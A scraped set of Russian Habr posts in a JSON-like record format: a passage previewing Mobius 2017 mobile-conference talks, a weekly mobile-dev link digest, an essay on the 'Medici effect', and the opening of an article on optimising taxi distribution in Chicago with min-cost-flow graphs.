для Android CI — с описанием преимуществ, ограничений, фишек и производительности. \n\r\nКонечно, будет живое демо по настройке Jenkins Android slave через Android Docker image за 2 минуты (Как бы невероятно это ни звучало). \n\r\nВ докладе хватает моментов, которые выглядят как вызов стереотипам. При желании поучаствовать в дискуссии просьба готовить вопросы на английском. *\n\r\n*Cам написал, сам перечитал… нет, это не та же статья, что и «Docker, Docker, Docker». \n\nСергей @willykolepniy Боиштян — Как я возненавидел ORM\r\nРеклама Тинькофф в той или иной мере появляется регулярно, хайпы и т.д. Но в нашей истории примечателен сам спикер, а Сергей уже два года является частью команды разработки мобильного приложения для юридических лиц. При том что в 2013 у него всё начиналось ещё с профессии бармена, Java и бэкенда. \n\r\nДоклад Сергея будет о текущем проекте на Android, какие проблемы команде принесла ORM (рост размера базы до умопомрачительных размеров) и как их решали. Обсудим назначение ORM и какие ограничения она накладывает на разработчиков. Цель доклада — заставить рядового разработчика задуматься о целесообразности использования ORM в своем проекте. Технологии, которые будут задействованы: OrmLite, Stetho, DBInspector, Sqlite.\n\nИван @IvanPonomarev Пономарев — Crash-репорты Android NDK\r\nИван — ведущий программист под мобильные платформы компании Аквелон. Позади более 5 лет опыта в игровой индустрии со специализацией на кроссплатформенной разработке под мобильные устройства с использованием C/C++ (и они работают, например, у компании есть видео об управлении устройством для наливания пива с мобильного телефона). С проблемой сбора информации об ошибках в NDK-коде знаком не понаслышке, об этом и будет говорить. \n\r\nВ первой части доклада будут кратко рассмотрены уже имеющиеся наработки: как работает встроенный отладчик Android, какие решения уже существуют.\n\r\nВторая часть посвящена рассказу о том, как это работает «под капотом»: как получить состояние процессора на момент ошибки, как раскрутить стек вызовов, как узнать номера строк в исходном коде. Будет дан обзор таких библиотек для раскрутки стека, как libcorkscrew, libunwind, libunwindstack.\n\r\nДоклад будет интересен как Android-разработчикам, в чьих приложениях используется NDK, так и всем остальным для расширения кругозора.\n\nАлексей Буздин — Заставь свой гаджет говорить: Google Assistant\r\nА вот при изучении этого доклада автору, естественно, вспомнилась куча мемов из области Siri, Alexa, Алёнка и Алиса, Amazon Home, Google Home и, в конце концов, шутка про шотландский акцент и голосовое управление лифта… \n\r\nВместе с Алексеем будем погружаться в мир Google Assistant.\r\nВ докладе спикер покажет, как начать писать приложения для Google Assistant и тестировать их на Android, iOS и Google Home. В течение 40 минут мы вместе напишем приложение с нуля и отладим его с помощью Google Home.\n\r\nВ общем и целом Алексей знает, как организовать сообщество, что он регулярно и делает, устраивая встречи Google Developers Group Riga, Java User Group Latvia и ежегодную конференцию Riga Dev Day.\n\nЕвгений @smart_jk Сатуров — Instant Apps: как научить приложение работать без установки\r\nНачнём издалека. 4,8 на Google Play — это много или мало? Понятно, что это достаточно условно, но возьмём за гипотезу, что это честный рейтинг, проверенный и добровольный. \n\r\nИтак, Евгений — лидер команды Лабиринт Android, той самой, которая первой в России реализовала Instant App и может похвастаться приложением с оценкой 4,8 в Google Play.\n\r\nГоворить будем об Instant Apps — возможности использования приложения без необходимости устанавливать его на устройство. В рамках доклада будет рассказано о самой технологии, об опыте реализации, о том, как подготовить проект к внедрению Instant Apps и подводных камнях, с которыми можно столкнуться в процессе. Особое внимание будет уделено вопросу выбора use cases, а также бенефитам, которые дает чистая архитектура в контексте создания Instant Apps.\n\nEnrique López Mañas — TensorFlow for mobile devs\r\nЭнирике Лопес работает с мобильными технологиями с 2007 года и за это время повидал много хайпов, поэтому знает в них толк. В данный момент идёт хайп вокруг ML и AI, и для того, чтобы быть на волне, он предлагает использовать TensorFlow в роли основного фреймворка от Google. А при условии, что сам Enrique López Mañas является Google Developer Expert и одним из основоположников Google LaunchPad accelerator, то как тут не хайпануть, да ещё и получить выгоду от использования ML. Перед конференцией даже выпущен предварительный пост по его работе, чтобы вы могли успеть подготовиться.\n\nСергей @Reallife Рябов — Пишем Java-френдли Kotlin-код\r\nСергей Рябов — независимый Android-разработчик с бэкенд-бэкграундом. Несколько лет назад обрёл Kotlin-суперспособности, которые и по сей день использует во благо в своих экспериментах и продакшне. Rx-фанатик, Kotlin-евангелист.\r\nИ как любой евангелист, он готов нести знание в массы. В этот раз о том, как писать Kotlin-код, чтобы его можно было использовать в Java. Действительно, интероп с Java широко разрекламирован. Однако, в то время как Java-код дёргать из Kotlin можно без особых проблем, работа с православным Kotlin-кодом из Java имеет свои нюансы. Сергей расскажет, что же припасли создатели Kotlin для таких случаев.\n\nДоклады про iOS\n\nАндрей @s1dd0k Володин — Как стать GPU-инженером за час\r\nАндрей Володин — lead developer Cocos2d-ObjC, создатель первого приложения на Swift под Android, автор кроссплатформенного игрового движка Fiber2D, в настоящее время — Metal/ARKit-инженер.\n\r\nАндрей поможет нам добраться до видеокарты мобильных телефонов. Кто-то может помнить бородатую шутку про «связки Айфонов на колокейшене». В какой-то мере это не шутка. А именно: \r\nСовременный мир не был бы таким, какой он есть, без GPU-вычислений. Современные консольные игры, VR, AR, криптовалюты, машинное обучение — всё это работает на горячих графических процессорах.\n\r\nОднако среди мобильных разработчиков видеокарты не пользуются большой популярностью: многие думают, что это очень сложно, а некоторые вообще не замечают, что iPhone в принципе имеет видеокарту.\n\r\nС помощью этого доклада хотелось бы ознакомить широкие массы разработчиков с программированием графических процессоров, с прицелом на мобильные платформы и, конечно же, трендовые темы.\n\nМаксим @max_sokolov Соколов — Мессенджер наизнанку, или Как сегодня сделать мессенджер в мобильном iOS-приложении\r\nПредставьте, что вместо того, чтобы оторвать бумажку с телефоном от объявления на подъезде, можно взять смартфон и сразу написать владельцу напрямую, уточнив статус, не мучаясь с проблемой «трубу не берёт, достали, продали» и т.д. \r\nДля получения подобного мессенджера Максиму Соколову, как Team Lead в Avito, пришлось пройти через все тяжкие, от простого HTTP-API до использования веб-сокетов, узнавая про плюсы, минусы и подводные камни различных подходов. Максим поделится, как его команда проектировала клиент-серверное API и как в этом помогал Swift. Вы узнаете о том, как гарантировать доставку сообщений клиентам, онлайн-статусы пользователей, статусы сообщений и других функциях современных мессенджеров и их реализации.\r\nМессенджеры развиваются стремительно и новый функционал требуется добавлять быстро. В рамках доклада будет рассказано, как заложить масштабируемую архитектуру, которая позволит легко добавлять новые фишки.\n\nЕвгений @ptiz Камышанов — Жизнь без подключения: от хаоса к консенсусу\r\nСлишком много исторических отсылок получается в ходе обзора. Но что поделать, история движется по спирали: «приложения на десктопе стремятся работать в облаке независимо от локальной памяти», «приложения на телефоне постепенно обретают всё больший оффлайн-функционал».\r\nХорошо это или не очень, можно будет обсудить с Евгением Камышановым из EPAM после его практической демонстрации данного явления в ходе доклада. \r\nПри всём этом, будучи Lead iOS developer в компании EPAM в Санкт-Петербурге, спикер не верит в серебряные пули и по мере сил борется с перфекционизмом. \n\nMarcin Krzyżanowski — Decipher the encoding\r\nMarcin — это не просто разработчик и автор Natalie, CryptoSwift и ObjectivePGP, но и тот, кто пытается всё же сохранить приватность при помощи PrivacyApp.io Как следствие последнего, про процессы Encoding он знает много… очень много. Конечно, в докладе будет присутствовать не только практика, но и сравнение encoding vs. encryption. Что больше используется в реальной жизни, пояснения с примерами (по большей части на iOS, но не только).\r\nКстати, Marcin с нами не в первый раз и уже был приятно удивлен высоким уровнем нашего комьюнити. Надеемся, в этот раз у него будет возможность укрепиться в вере в high level наших мобильных разработчиков. \n\nДмитрий @handamade Куркин — Оптимизация размера приложения\r\nИтак, с чем у вас ассоциируется звук «о-оу»? За всех, естественно, говорить не стоит, но для тех, кто начинал до пришествия iPhone — это звук одного мессенджера, который по знаменитости был сопоставим с теперешним Telegram. \r\nК чему это всё? Дмитрий 12 лет занимается разработкой мессенджеров под разные платформы. Последние 5 лет делает iOS клиент для ICQ (звук «о-оу») в должности team lead. \r\nРассмотрим, из чего складывается размер приложения на iOS и как этот размер можно уменьшить. Приведем несколько экспериментов для пояснения, из чего в итоге складывается размер приложения в AppStore, и расскажем про инструменты, которые помогут найти лишние данные и определить наиболее объемные участки кода программы.\n\nГлеб @Novixon Новик — Архитектура сервисного слоя с использованием составных операций\r\nНаверняка многим знаком подкаст про мобильную разработку Podlodka. Его ведёт Глеб Новик, автор фреймворка COOperation. \r\nДоклад Глеба будет построен вокруг распространенного способа построения сервисного слоя приложения — это использование механизмов GCD для создания асинхронного взаимодействия компонентов. Многие задумываются, но мало кто использует на практике всю мощь классов NSOperation и NSOperationQueue для данной задачи.\r\nС помощью тщательной декомпозиции и небольшой доработки указанных классов можно получить чрезвычайно гибкий и переносимый компонент, который станет верным другом при создании новых сервисов. Глеб расскажет о том, как можно использовать составные операции при построении сервисного слоя и как в этом может помочь разработанный им фреймворк COOperation.\n\nОбласть общей полезности — уже не среда, а нечто большее\n\nВладимир @dzigoro Иванов — Пустота наследия: стратегия кардинальных улучшений в проекте\r\nВладимир — один из достаточно частых гостей наших конференций, и его должность ведущего разработчика в EPAM этому не причина. Всё дело в использовании круга интересов (Android, React, iOS, Web) и не менее занимательного бэкграунда спикера (начинал как Java EE-инженер, но увлекся мобильным технологиями «и покатился»). \r\nДля начала разомнём мат. аппарат (от слова «мат», а не «математика»). Разберём «Legacy». Каждому разработчику приходится сталкиваться с ним постоянно. Более того, каждый новый проект становится legacy со временем, если не уделять достаточно внимания техническому долгу. В докладе поговорим, как жить с особо запущенным случаем, aka проектом возраста более 5 лет.\r\nМы узнаем:\n\nкак осознать размер долга;\nкак придумать план рефакторинга;\nпровести его максимально безболезненно.\n\r\nКод будет на Java, но специфики Android почти нет, поэтому интересно будет инженерам обеих платформ.\r\nНемного теории, много практики, щепотка статистики, нескучные картинки — всё, как вы любите.\n\nКонстантин @Konojoto Якушев — Универсальные ссылки — дворец из подводных камней\r\nПредставление данного спикера хотелось бы начать с введения к докладу его коллеги: \n«Кто думает, что Badoo — это поисковая сеть? А кто думает, что это китайский внутренний онлайн-магазин?». Честно, в зале на другой нашей конференции на оба вопроса руки поднимали далеко не единицы. Собственно, и ваш покорный слуга в том числе. Так что жертвами стереотипов могут быть все. \n\r\nВ итоге, это самый большой портал по знакомствам (300+ млн. пользователей), бешеное количество обращений и скачиваний. Чем направлять весь этот поток? Константин предлагает отправиться в путешествие в мир универсальных ссылок вместе с ним. Но с большими оговорками: \n\r\n«Всё это осложняется тем, что, как только универсальные ссылки запущены, пути назад нет. Нужно их поддерживать, и ваши ошибки, возможно, навсегда останутся с вами».\n\r\nА чтобы у вас осталось меньше ошибок «навсегда», мы и предлагаем этот доклад. Мы ожидаем, что человек, прослушавший его, получит достаточно информации, чтобы с нуля запустить современную систему универсальных ссылок в своей компании без проблем и сомнений.\n\nАлександр @zlx Зимин — Давайте проектировать UI правильно\r\nУже прошло несколько месяцев с того момента, как мы взяли интервью у Александра, которое можно почитать тут. Информация в статье позволит представить спикера в разы лучше, чем тысяча лишних знаков в обзоре, поэтому перейдём непосредственно к докладу. \r\nВ докладе Александр расскажет про подходы к разработке UI, которые позволяют новым разработчикам вносить изменения без переписывания кода и переиспользования написанных компонентов.\r\nТакже часть доклада будет посвящена Atomic Design. Многие популярные приложения используют нестандартные визуальные компоненты, и команда Badoo — не исключение. Чтобы это не создавало много головной боли дизайнерам и разработчикам, им пришлось выработать решение, которое и будет представлено в докладе.\n\nВне категорий (и законов корпорации)\n\r\nДля начала промокод для тех кто дочитал до этого момента (или случайно на него попал) —\r\nиспользуя при регистрации ключевую фразу выше, вы можете приобрести билеты по октябрьской цене по 5 ноября включительно. Если еще не успели зарегистрироваться – это ваш шанс!\nИспользовать шанс!LastCallMobius\n\n\nЙонатан Левин — Как самому запилить новую фичу и при этом не быть убитым своим менеджером\r\nУ вас когда-нибудь была ситуация, когда вы работаете в компании над приложением, и внезапно вам в голову приходит идея новой крутой фичи? Вы понимаете, вот он — переломный момент, но когда вы обращаетесь за поддержкой и одобрением на разработку, вы сталкиваетесь с препятствием: «У нас нет ресурсов», или «На данный момент у нас другие приоритеты». Сотрудники, которые не понаслышке знакомы с продуктом компании, больше всего подходят для придумывания и проектирования лучших фич для приложения, но иногда на пути встают политики и процедуры компании. Но где есть желание, там есть возможности! Мир завоёвывают повстанцы и мятежники — Империя должна пасть! Если вы знаете, что эта фича важна, но у вас нет разрешения продолжать, вам придётся осторожно балансировать между свободой творчества и уважением к приоритетам вашей компании. \n\r\nВ данном докладе Йонатан поделится, как он разработал фичу без разрешения и как при этом его не уволили/покалечили/убили.\n\r\nЙонатан — один из ведущих израильских мобильных разработчиков, часть элитной команды Google Developer Experts. Сыграл ключевую роль в успехе Gett, собравшем более 500 миллионов долларов, а также получил финансирование своего стартапа KolGene, набирающего популярность генетического market connector-а. Будучи верным приверженцем мобильного и продукт-менеджмента, Йонатан также с большим энтузиазмом занимается бэкендом. Как состоявшийся разработчик и предприниматель, он точно знает, как превратить умные идеи в прибыльный продукт. \r\n©Mobius 2017 Moscow (текст-описания доклада Йонатана взят с сайта как самодостаточный и не нуждающийся в сокращении или дополнении) \n\r\nНа этом всё с докладами, но не с конференцией. Безусловно, выбрать слот и свой путь можно до начала, следуя программе Mobius 2017 Moscow. Либо просто взять и прийти / взять трансляцию совершив свой «прыжок веры».\r\nЕсли остались вопросы, то их можно задать в комментариях, либо в нашем телеграм-канале Mobiusсonf .\r\nИ если вдруг есть сложности и вы не знаете, как с ними быть, то у нас есть ещё и Ч.А.В.О. \r\nДо встречи на конференции Mobius 2017 Moscow!", {"day": "31", "month": "октября", "time": "18:09"}, {"rate": 24, "views": 4700}], ["В нашем новом еженедельном дайджесте мы играем в APK-гольф, изучаем фреймворки, храним данные, учим ИИ разговаривать и изучаем миллиардные бизнесы на примерах.\n\n\n\n\n\n\nИграем в APK-гольф. Уменьшение размера файлов Android APK на 99,9%\n\nВ гольфе выигрывает тот, у кого меньше очков. Применим этот принцип в Android. Мы собираемся поиграть в APK-гольф и создать приложение минимально возможного размера, которое можно установить на Android 8.0 Oreo.\n\n\nКак Яндекс учит искусственный интеллект разговаривать с людьми\n\nСегодня мы расскажем читателям Хабра о том, как мы приближаем это будущее на примере Алисы – первого голосового помощника, который не ограничивается набором заранее заданных ответов и использует для общения нейронные сети.\n\nДайджест доступен и в виде рассылки. Подписаться вы можете тут (у нас уже 2000+ подписчиков!).\n\n iOS\n\r\n• (+9) MvvmCross для простого приложения iOS на C#\r\n• (+6) iOS Safari 11 теперь умеет WebRTC\r\n• Игры это 53% ARKit загрузок и 62% дохода\r\n• iOS-приложения могут подменят системные диалоги и красть пароли\r\n• Спилберг снимет сериал для Apple\r\n•  Как мы делали решатель судоку на ARKit\r\n•  Забудьте о datasource и delegate: новый подход к UITableView\r\n•  Руководство по анимации в iOS\r\n•  VirtualGameController: виртуальный контроллер\r\n•  ViewAnimator: анимация в одну строчку\n\n Android\n\r\n• (+23) От бесполезного хобби до фичеринга в Google Play\r\n• (+9) Красные стрелы доп-реальности\r\n• (+7) Kakao — как сделать UI тестирование снова великим\r\n• (+3) Планирование задач в Android с использованием JobScheduler и IntentService\r\n• Реализация сложного дизайна интерфейса на Android\r\n• Как использовать фреймворк Autofill в Android Oreo\r\n• Создание игр и приложений для Google Assistant из электронных таблиц\r\n• Что каждый разработчик должен знать о поиске\r\n•  Android Dev Подкаст. Выпуск 44. Хранение данных в Android\r\n•  Управление ярлыками\r\n•  Прохождение экзамена Google Certified Associate Android Developer\r\n•  Как пережить изменение конфигурации с помощью Dagger\r\n•  5 шагов, чтобы протестировать ваше приложение\r\n•  Создаем Offline-First приложение с MVVM, RxJava, Room и Priority Job Queue\r\n•  Ловушки Kotlin и как их избегать\r\n•  Как мы использовали Firebase в нашей игре: коллекция твитов\r\n•  Улучшите продуктивность разработки – используйте Compound ViewGroup\r\n•  Уровень хранения данных с Room и Dagger 2\r\n•  Учим новые движения: продвинутая анимация в Android\r\n•  Асинхронная загрузка данных при помощи Google Paging Library\r\n•  Модульная архитектура для ускорения сборки\r\n•  Literally Toast: тост с надписью\r\n•  Chips Input Layout: ViewGroup для показа чипсов\r\n•  GoPlaces: запуск приложений на телефоне/эмуляторе из терминала\n\n Windows\n\r\n• Microsoft прекращает работы над Windows 10 Mobile\n\n Разработка\n\r\n• (+12) Cocos2d-x — Работа со спрайтами\r\n• (+9) Redux: отправляем асинхронность туда, где ей самое место\r\n• (+7) Как принимать платежи в мобильном приложении: токенизация, NFC, оптическое сканирование и другие плюшки в одном SDK\r\n• ВКонтакте представил обновление игровой платформы на конференции VK High Score\r\n• Стив Возняк открывает «цифровой институт» Woz U\r\n• Почему авторы Trello не смогли создать бизнес на 1 миллиард долларов\r\n• Постмортем Crossbar Challenge: 500,000 загрузок, фичеринг и убытки\r\n• Wargaming открывает в Москве мобильную студию\r\n• Oculus выпустил Avatar SDK и Explore API\r\n• Отчет Realm: факты и тренды мобильной разработки\r\n• Разработка в микроавтобусе: первые 5 месяцев\r\n• История Shadow Fight 2 SE: зачем Nekki сделала платную версию своего хита\r\n• Почему я не могу отказаться от своей инди-игры\r\n• Подкаст AppTractor: конструкторы приложений с Mobifitness\r\n• 7 способов избежать создания плохого мобильного приложения\r\n• Podlodka #27: объектно-ориентированное программирование\r\n• Как сделать три игры за год без опыта в геймдеве\r\n•  Как сделать изометрические океанские волны\r\n•  3D FPS движок с нуля\r\n•  Как Dreamz Studio получила $200К не сделав ни одной игры\r\n•  Что мы делаем с Google Flutter\r\n•  Лучшие практики Developer Experience (DX)\r\n•  Luminoth: Open Source Toolkit для компьютерного зрения\n\n Аналитика, маркетинг и монетизация\n\r\n• Gett подозревает Яндекс.Такси в слежении за пользователями через приложение\r\n• App Annie: исследование приложений для розничной торговли\r\n• У AppMetrica вышло мобильное приложение для iOS и Android\r\n• Покупатель на крючке: рецепт формирования зависимости\r\n• Пять ошибок Airbnb, которые помогли ему вырасти\r\n•  Руководство по монетизации: как не испортить ваше приложение\r\n•  Как превратить ваше приложение в привычку\r\n•  Как автоматические пуши и геофенсинг могут увеличить вовлеченность\n\n Устройства, IoT, AI\n\r\n• (+5) Как я учился прогать ИИ последние два месяца\r\n• Nokia продаст 10 млн смартфонов в первый год\r\n• Новая теория раскрывает тайну работы нейронных сетей\r\n• Искусственный интеллект будет размечать Pornhub\r\n• Oculus представил новый отдельный шлем Oculus Go\r\n• NVIDIA представляет первый в мире компьютер с искусственным интеллектом для автономных автомобилей\r\n• Дайджест интернета вещей: Сентябрь 2017\r\n•  Еженедельные подборки Spotify: как машинное обучение находит для вас музыку\r\n•  Голосовое управление для телевизора через Amazon Alexa и Raspberry Pi\r\n•  Nokia прекращает производство VR-устройства\n\r\n< Предыдущий дайджест. Если у вас есть другие интересные материалы или вы нашли ошибку — пришлите, пожалуйста, на почту.", {"day": "15", "month": "октября", "time": "17:58"}, {"rate": 12, "views": 7800}], ["Во Флоренции XV века семья Медичи собрала самых образованных и талантливых людей своего времени. Скульпторы и поэты, художники и учёные, воины и философы учились друг у друга, разрушая границы между дисциплинами и культурами, создавая на их стыке истинные шедевры. Феномен креативного сочетания несочетаемого Франс Йоханссон назвал «эффектом Медичи». Суть в том, чтобы создавать новое на пересечении разных идей, разрушая ассоциативные барьеры и выявляя неожиданные на первый взгляд связи.\n\r\nПодробно «Эффект Медичи» описан в книге Йоханнсона. Тем же, кому лень читать книгу, рекомендую посмотреть этот минутный ролик. Вся суть «Эффекта» там достаточно доходчиво и, главное, лаконично, передана. \n\r\nСегодня мы живем в эпоху, в которой объектов для пересечений и скрещивания на порядки больше, чем во времена Медичи. На лицо очевидное ускорение динамики размножения скрещиваемых сущностей, а темп такого размножения усиливается с каждым днем. Отсюда и сегодняшний разгул стартаперства. Еще совсем недавно телефон был скрещен с фотоаппаратом, а теперь уже речь идет о скрещивании «фототелефоноаппарата» с блендером, который, в свою очередь уже был скрещен с микроволновкой. \n\r\nОбласти пересечений плодятся как бесконечная геометрическая прогрессия. \n\n\nПоследовательность площадей квадратов, где каждый следующий квадрат получается соединением середин сторон предыдущего — бесконечная геометрическая прогрессия со знаменателем.\r\nДля нас, стартаперов, девелоперов и просто активных людей, такое развитие событий безусловный подарок судьбы. Ведь скрестить можно что угодно с чем угодно. Казалось бы, это же клондайк для изобретателя. Составляй списки успешных сущностей и прекрещивай их: Uber и церковь, автомобиль и вертолет, телефон и секс и тп. Метод подобного поиска идей, кстати, Йоханссон весьма подробно описывает в своей книге. Но там нет важной детали. А что скрещивать нельзя? Точнее, что скрещивать бессмысленно или вредно для создателя и общества, в котором он находится? Давайте порассуждаем. \n\r\nВот несколько групп этого «нельзя».\n\n1. «Впихнуть невпихуемое»\r\nНа днях участвовал в сессии по вопросам Энтерпрайз Архитектуры нашей уже не молодой компании. Попытки хаотичного скрещивания разных подходов в погоне за быстрым результатам приводят в Enterprise Architecture вот к такому результату. \n\r\nДумаю, не стоит объяснять, чем такой подход грозит на практике. \n\r\nДругой пример вредного скрещивания идеально иллюстрируется на примере всем известных мультифункциональных ножей. \n\r\nВывод из этих примеров таков: скрещивать нельзя функции, объединение которых приведет к невозможности использования итогового продукта. В случае с запутанной энтерпрайз архитектурой все может рухнуть в один момент при нарушении любой из связей между любыми, даже самыми незначительными элементами. В случае с ножом все до банальности просто – он не помещается в руку, а значит смысла в нем нет. \n\n2. Бессмыслица\r\nНет смысла скрещивать идентичные сущности. Да простят меня сексуальные меньшинства, но от скрещивания мужика с мужиком ничего не получится. В этом попросту нет смысла. Точно также и в других сферах. Смысла в пересечении Windows и iOs, Mailchimp и MailGun, Ubera и Gett попросту нет. У них одинаковые потребительские характеристики. Ничего принципиально нового от такого соития мы не получим. В лучшем случае что-то точно такое же. \n\n3. Опасность\r\nДавайте поговорим об опасном виде пересечений. Простейший пример этого явления – скрещивание сандаликов и носочков. \n\n\n\r\nТакой подход опасен для любителя подобного «комфорта» в одежде. Его попросту не воспримут в обществе. И пусть со мной не согласятся тренсеттеры современной моды. \n\r\nВ дискуссии под упомянутым в начале статьи роликом, несколько уважаемых господ привели два отличных примера из области химии и физики. «Нельзя скрещивать концентрированные (или горячие) растворы кислот и щелочей. Это важное правило техники безопасности, нарушение которого грозит химику, ну или просто криворукому экспериментатору серьезными неприятностями» (с) Alex Sol. Также, как и «нельзя скрещивать атомные ядра одних частиц с другими ядрами или элементарными частицами. Последствием взаимодействия может стать деление ядра и испускание новых элементарных частиц. Кинетическая энергия вновь образованных частиц может быть гораздо выше первоначальной» (с) Andrey Alekseev. \n\r\nЧто это значит для девелопера? Все как и с элементарными частицами и ядерным оружием, которое сначала увлеченно создавали, а теперь пишут тома документов, регламентирующих всеобщее разоружение. Американские АНБ и ЦРУ разрабатывают передовое ПО для слежки за всем миром в целях общей безопасности и мира во всем мире, а на деле, минимальная утечка кода, приводит к созданию вирусов типа нашумевшего недавно Wannaсry. Как сказал один мудрый человек, нельзя соединять добро со злом. Вывод, перед созданием чего то нового путем скрещивания старого – посмотрите, не убьет ли это вас. Стоит только учитывать, что подобные опасения не должны тормозить технический прогресс и автоматизацию, замещающую рутинный человеческий труд. \n\r\nИтак, если:\n\n\n Впихивание невпихуемого в область пересечения не сломает итоговых потребительских характеристик и продуктом можно будет пользоваться,\n Мы не пытаемся «поженить» одинаковые сущности,\n Мы трезво отдаем себе отчет в том, что плод скрещивания не взорвется и не погубит всех вокруг;\n\r\nВперёд! Составляем списки возможных «родителей» и двигаем мир вперед. Вполне возможно, что приложение для заказа такси, которое параллельно будет измерять твое артериальное давление и делать тебе МРТ пока ты стоишь на обочине, станет очередным проектом-единорогом. \n\nИсточники:\n\nFrans Johansson. The Medici Effect: Breakthrough Insights at the Intersection of Ideas, Concepts, and Cultures.\nИнвестория. Коллекция минутных видео.", {"day": "22", "month": "июня", "time": "14:52"}, {"rate": 6, "views": 6900}], ["Наверное, сейчас очень мало людей, которым ни разу не приходилось пользоваться услугами такси, тем более, что последнее время популярность этого вида транспорта растет, а цена неуклонно падает. На личном опыте могу сказать, что это удобный способ, например, съездить с маленьким ребенком в поликлинику.\nА Вы когда-нибудь задумывались, за что мы платим, пользуясь такси?\nБез сомнения, основную часть составляет плата за время водителя и издержки на автомобиль, однако было бы довольно опрометчиво считать, что эта плата распространяется только на то время, пока Вы в пути. Кода таксисту приходится долго ждать очередного заказа, кто заплатит за его время и простой машины? — в конечном итоге мы с вами. Таксист по праву не согласится на вознаграждение за день ниже его стоимости на трудовом рынке, выполняй он при этом в среднем пять заказов или двадцать пять. Мне стало интересно, каково время не выгодного никому простоя и как его можно уменьшить. Ниже я хотел бы поделиться с вами результатами собственного исследования этого вопроса.\nКак работает современный таксист?\nПолучает заказ от диспетчера или через приложение для таксистов, отвозит пассажира до нужного ему места, и чаще всего дожидается очередного заказа неподалеку от места высадки.\nЧем плоха такая политика?\nМожет приводить к ситуации, когда в некоторых районах города скапливается слишком много таксистов, которым приходится подолгу стоять в очереди на следующий заказ, в то время как\r\nв других районах возникает дефицит свободных машин и часть заказов поэтому оказываются потерянными. В наиболее острой форме описанная проблема возникает в результате суточных миграций: утром таксисты вместе с потоком работающего населения \"утекают\" из жилых районов, где в это время к тому же повышенный спрос на их услуги, и скапливаются в центре, где плотность заказов наоборот понижена, и особенно мало желающих вернуться домой.\nЯвляются ли предыдущие выводы правдоподобными рассуждениями или они как-то проверены на практике?\nКогда я об этом подумал впервые, я опирался исключительно на здравый смысл и небольшой опыт общения с подвозившими меня таксистами. Однако, в тот момент, когда у меня появился первый эскиз оптимизирующего работу службы такси алгоритма, мне конечно же захотелось проверить свои гипотезы и оценить эффективность полученного решения. По понятным причинам ни один из крупных игроков рынка, вроде Uber, Gett, или \"отечественного\" Яндекс.Такси не пожелал бы открыть нужную мне информацию. К счастью, администрация далекого Чикаго уже давно собирает и выкладывает в открытый доступ данные обо всех поездках значительной части служб городского такси.(подробнее смотрите \"Примечания о данных\").\nКакого же положение дел было в Чикаго за 2016 год?\nСогласно моим оценкам (об их методике подробнее в \"Примечаниях об оценках времени обслуживания\"), из проведенного всеми таксистами на рабочем месте времени в лучшем случае только 46% от него занимало выполнение заказов. Что касается негативного проявления эффекта суточной миграции, то в среднем число доступных машин внутри административных районов на 30% больше либо меньше числа поступающих заказов в это время.\nЧто и как можно улучшить?\nСамо собой напрашивается два очевидных направления действий:\n1) Организовать переброску машин из районов, где их слишком много, в районы, где в них наблюдается или ожидается дефицит.\r\n2) Поддерживать в каждом районе оптимальным число ожидающих заказа машин.\nКонечно, можно поставить более общую задачу максимизации прибыли, и в ходе ее решения даже отказаться от обслуживания части \"невыгодных\" маршрутов, однако такая стратегия чревата для компании потерей приверженности в целом выгодных ей пользователей, если по \"невыгодным\" маршрутам их будет обслуживать конкурирующий игрок. Учитывая такую возможность, достаточно разумной выглядит попытка обслужить все доступные заказы, но с наименьшими издержками.\nКакие требования стоит предъявить к хорошему алгоритму перераспределения трафика?\nЗдесь, по моему мнению, желательно выполнение следующих условий:\nа) Общее время, затраченное на переброску, поскольку оно не оплачивается пассажирами, желательно сделать как можно меньшим( В написанной мною программе, например, для этого используется специальные минимизирующие алгоритмы на графах, но о них позже);\nb) Так как достаток водителей чаще всего напрямую зависит от объема выполненных ими заказов, то желательно, чтобы накладные издержки времени на реализацию алгоритма ложились на каждого из них в равной мере. Следует также учесть, что водитель, получивший предписание перемещаться в другой район, скорее выполнит его, если на это уйдет 15 минут, и скорее проигнорирует, если — 50.\nс) Степень дефицита числа свободных машин в каждом районе меняется в течении суток, поэтому алгоритм должен устранять дисбаланс с достаточной оперативностью и при планировании потоков переброски рассчитывать их с учетом ситуации в будущем.\nd) Вычислительная сложность алгоритма должна давать возможность реализовать его на практике.\nМаленькая хитрость, сильно упрощающая дело\nПредставьте себе двадцать солдат, стоящих перед вами в шеренгу. Как добиться, чтобы место перед первым стало занятым, а место последнего освободилось? Один из способов — попросить стоящего последним перейти вперед. Другой способ сделать то же самое, но в двадцать раз быстрее — попросить всех солдат сдвинуться всего на одну позицию. Эта идея, примененная к машинам такси, означает следующее: вместо их переброски из профицитного района А непосредственно в удаленный от него дефицитный район В можно \"сдвинуть\" автомобили всего на одну позицию вдоль цепочки районов, ведущей из А в В. Такое решение, с одной стороны, позволяет практически мгновенно, по сравнению со скоростью изменения дефицита на карте, устранить дисбаланс, с другой, требует от водителей тратить на \"сдвиги\" каждый раз не более 15-ти минут.\nКаков математический метод реализации алгоритма перераспределения трафика?\n(Здесь я подробно опишу технические подробности разработанного мною алгоритма, читатель, интересующийся только результатами может пропустить эту часть статьи.)\nДавайте попытаемся свести проблему к хорошо известной задаче на графах отыскания в сети производства-потребления потока снабжения минимальной стоимости. Поскольку спрос на машины такси и их распределение по городу зависят от времени суток и дня недели, построим отдельный граф описанным ниже способом для каждого дня недели и интервала времени длинною в час. Вершинами графа будут выступать административные районы. Те из них, в которых ожидаемое число I освободившихся после выполнения заказа машин превышает предполагаемое число заказов U, займут роль центров производства с мощностью S = I — U, остальные — роль центров потребления с мощностью — S = U — I. Величину S назовем дисбалансом вершины (района). Будем считать, что из района А в район В есть ребро, если (и только если) из А в В можно добраться в среднем за время t, не превышающее 15-ти минут, при этом t есть стоимость этого ребра (подробнее смотрите \"Примечания об оценке времени пути между районами\"). В классической задаче о сети производства-потребления ограничения на пропускаемую величину потока имеют ребра графа, однако в рассматриваемом случае трудно предположить, что одни только таксисты могут вызвать затор на шоссе, а вот дважды в одном промежутке между заказами \"сдвигать\" водителя было бы дурным тоном с нашей стороны. В силу последнего замечания \"сдвиговый\" поток из вершины не должен превышать I.\nЕсть ли способ так трансформировать граф, чтобы можно было применить алгоритмы для стандартной задачи поиска потока минимальной стоимости?\nДавайте выберем любую вершину и заменим ее двумя новыми так, чтобы при этом в первую входили все ребра, входившие в исходную, а из второй — выходили все, из исходной выходившие.Осталось соединить эти две новые вершины единственным ребром с нулевой стоимостью и пропускной способностью I и приписать первой дисбаланс S, а второй — ноль. Проделав такое преобразование с каждой вершиной исходного графа, вы переведете его к виду, стандартному для задачи о потоке минимальной стоимости, 